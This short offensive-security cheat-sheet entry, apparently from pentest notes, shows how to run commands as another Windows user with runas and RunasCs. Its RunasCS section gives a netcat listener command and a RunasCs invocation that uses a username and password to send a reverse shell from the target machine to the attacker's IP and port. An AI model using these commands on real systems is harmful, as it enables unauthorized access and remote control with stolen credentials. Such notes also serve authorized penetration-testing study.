## Runas

```bash
runas /user:<username> cmd
runas /user:<domain>\<username> cmd
```

<br />

## RunasCS

We can spawn another shell as another user with [RunasCS](https://github.com/antonioCoco/RunasCs).  
First, start a listener on local machine.

```bash
nc -lvnp 4444
```

Then execute the following command on target machine.  
Replace `10.0.0.1:4444` with your local IP and port.

```powershell
RunasCs.exe <username> <password> cmd -r 10.0.0.1:4444
```
